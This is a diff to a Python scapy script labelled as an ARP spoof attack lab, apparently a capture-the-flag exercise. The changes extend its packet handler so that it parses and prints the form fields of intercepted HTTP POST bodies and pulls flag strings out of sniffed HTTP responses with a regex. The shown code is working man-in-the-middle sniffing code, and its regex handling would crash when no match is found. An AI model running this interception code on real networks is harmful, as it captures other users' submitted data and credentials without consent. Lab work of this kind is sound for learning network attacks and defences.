@@ -9,7 +9,9 @@ Lab - ARP Spoof Attack
 """
 
 from scapy.all import *
-from scapy.layers.http import HTTPRequest
+from scapy.layers.http import HTTPRequest, HTTPResponse
+from urllib.parse import parse_qs
+import re
 import logging
 import time
 
@@ -63,8 +65,13 @@ def process_packet(pkt: Packet) -> None:
 
         print(f"[+] HTTP: {url}{path} -> {method}")
         if method == "POST" and pkt.haslayer(Raw):
-            print(f" [>] {pkt[Raw].load}")
-
+            body = parse_qs(pkt[Raw].load.decode())
+            print(f" [>] {body}")
+    elif pkt.haslayer(HTTPResponse) and pkt.haslayer(Raw):
+        resp = pkt[Raw].load.decode()
+        matches = re.search("flag: (flag-.+?)</", resp)
+        if len(matches.groups()) == 1:
+            print(f" [<] {matches.group(1)}")
 
 def main() -> None:
     """ Do the attack """
